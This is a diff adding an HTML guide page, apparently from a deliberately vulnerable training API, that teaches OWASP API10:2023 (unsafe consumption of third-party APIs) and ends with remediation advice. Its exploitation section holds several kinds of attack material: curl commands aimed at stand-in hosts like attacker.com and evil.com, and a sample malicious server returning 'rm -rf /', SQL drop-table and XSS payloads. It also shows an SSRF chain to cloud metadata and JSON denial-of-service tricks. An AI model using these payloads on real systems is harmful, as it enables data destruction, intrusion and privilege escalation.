@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API10:2023 - Unsafe Consumption of APIs | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api10">API10:2023</span> Unsafe Consumption of APIs</h2>
+            <span class="badge badge-warning">MEDIUM SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>Developers tend to trust data received from third-party APIs more than user input, leading to weaker security standards. Attackers may target third-party services to get their malicious payload processed by your API, or exploit the trust relationship between your API and external services.</p>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/routes/files.py</code> - import-data endpoint trusts external API data</li>
+                <li><code>app/utils.py</code> - process_external_data function</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Exploitation Guide</h2>
+
+            <h3>1. Malicious External API Response</h3>
+            <p>The import-data endpoint fetches and processes external API data without validation:</p>
+            <div class="code-container">
+                <pre><code># Get auth token
+TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "john", "password": "password123"}' | jq -r '.token')
+
+# Set up a malicious server that returns crafted data
+# Example malicious response:
+# {
+#   "operations": [
+#     {"type": "delete_all_users"},
+#     {"type": "export_database"},
+#     {"type": "create_admin", "data": {"username": "backdoor"}}
+#   ]
+# }
+
+# Point the API to your malicious server
+curl -X POST http://localhost:5000/api/files/import-data \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"api_url": "http://attacker.com/malicious-api"}'</code></pre>
+            </div>
+
+            <h3>2. Simulate Malicious API with Local Server</h3>
+            <p>Create a simple malicious API server:</p>
+            <div class="code-container">
+                <pre><code># malicious_server.py
+from flask import Flask, jsonify
+app = Flask(__name__)
+
+@app.route('/api/data')
+def malicious_data():
+    return jsonify({
+        "operations": [
+            {"type": "sql_injection", "query": "'; DROP TABLE users; --"},
+            {"type": "command_injection", "cmd": "rm -rf /"},
+            {"type": "xss_payload", "data": "&lt;script&gt;alert('XSS')&lt;/script&gt;"}
+        ],
+        "users": [
+            {"username": "admin", "role": "admin", "password": "hacked"},
+            {"username": "&lt;script&gt;alert(1)&lt;/script&gt;", "email": "xss@evil.com"}
+        ]
+    })
+
+if __name__ == '__main__':
+    app.run(port=9999)
+
+# Run the malicious server
+python malicious_server.py &
+
+# Now point VulnAPI to consume it
+curl -X POST http://localhost:5000/api/files/import-data \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"api_url": "http://localhost:9999/api/data"}'</code></pre>
+            </div>
+
+            <h3>3. SSRF Chain via External API</h3>
+            <p>External API could redirect to internal resources:</p>
+            <div class="code-container">
+                <pre><code># The external API could return data that includes URLs to fetch:
+# {
+#   "webhooks": ["http://169.254.169.254/latest/meta-data/"],
+#   "resources": ["http://internal-db:5432/"]
+# }
+
+# If the API processes these URLs, it creates an SSRF chain</code></pre>
+            </div>
+
+            <h3>4. Data Injection via External Source</h3>
+            <p>External data is trusted and processed directly:</p>
+            <div class="code-container">
+                <pre><code># The vulnerable code:
+# def process_external_data(data):
+#     return data  # No validation!
+
+# If this data ends up in:
+# - SQL queries: SQL injection
+# - HTML templates: XSS
+# - System commands: Command injection
+# - File operations: Path traversal</code></pre>
+            </div>
+
+            <h3>5. Webhook Exploitation</h3>
+            <p>Webhooks can be used to inject malicious data:</p>
+            <div class="code-container">
+                <pre><code># Register webhook that returns malicious data
+curl -X POST http://localhost:5000/api/files/webhook \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"webhook_url": "http://evil.com/webhook", "event": "order_created"}'
+
+# The webhook endpoint at evil.com could return:
+# {
+#   "callback_url": "http://internal-admin/delete-all",
+#   "data": {"sql": "DROP TABLE orders;"}
+# }</code></pre>
+            </div>
+
+            <h3>6. JSON Parsing Attacks</h3>
+            <p>Malformed or oversized JSON from external APIs:</p>
+            <div class="code-container">
+                <pre><code># External API returns extremely nested JSON (billion laughs attack)
+# {
+#   "a": {"b": {"c": {"d": ... }}}  // Deeply nested
+# }
+
+# Or extremely large responses
+# { "data": "A" * 10000000000 }  // Memory exhaustion
+
+# Or duplicate keys exploiting parser inconsistencies
+# {"admin": false, "admin": true}</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Real-World Scenarios</h2>
+
+            <h3>Scenario 1: Third-Party Price API</h3>
+            <div class="code-container">
+                <pre><code># Your API trusts a third-party pricing service
+# Attacker compromises the pricing API and returns:
+{
+  "product_id": 1,
+  "price": -1000  // Negative price!
+}
+
+# Your API processes this and credits the user's account</code></pre>
+            </div>
+
+            <h3>Scenario 2: Partner Data Feed</h3>
+            <div class="code-container">
+                <pre><code># Partner API sends user data that's inserted into your database
+# Malicious partner sends:
+{
+  "users": [
+    {"name": "'; DELETE FROM users; --", "email": "sql@inject.com"}
+  ]
+}
+
+# Without validation, this causes SQL injection</code></pre>
+            </div>
+
+            <h3>Scenario 3: OAuth Provider Compromise</h3>
+            <div class="code-container">
+                <pre><code># You trust the OAuth provider's user info
+# Compromised provider returns:
+{
+  "sub": "admin",
+  "email": "hacker@evil.com",
+  "role": "administrator"  // Privilege escalation via trusted source
+}</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Supply Chain Attack:</strong> Compromised third-party leads to your compromise</li>
+                <li><strong>Data Injection:</strong> Malicious data processed without validation</li>
+                <li><strong>Privilege Escalation:</strong> External data sets user roles</li>
+                <li><strong>Denial of Service:</strong> Malformed data crashes your API</li>
+                <li><strong>SSRF Chain:</strong> External API redirects to internal resources</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Validate ALL data from external APIs (same as user input)</li>
+                <li>Use schema validation (JSON Schema) for external data</li>
+                <li>Implement request/response size limits</li>
+                <li>Use allowlists for expected values</li>
+                <li>Don't trust external data for authorization decisions</li>
+                <li>Sanitize external data before storage or display</li>
+                <li>Monitor third-party API responses for anomalies</li>
+                <li>Use API contracts and validate responses against them</li>
+            </ol>
+            <div class="code-container">
+                <pre><code># Secure implementation
+def process_external_data(data):
+    # Validate against schema
+    schema = {
+        "type": "object",
+        "properties": {
+            "name": {"type": "string", "maxLength": 100},
+            "price": {"type": "number", "minimum": 0}
+        },
+        "required": ["name", "price"]
+    }
+    validate(data, schema)  # Raises if invalid
+
+    # Sanitize strings
+    data['name'] = bleach.clean(data['name'])
+
+    # Validate business logic
+    if data['price'] > MAX_PRICE:
+        raise ValueError("Price exceeds maximum")
+
+    return data</code></pre>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
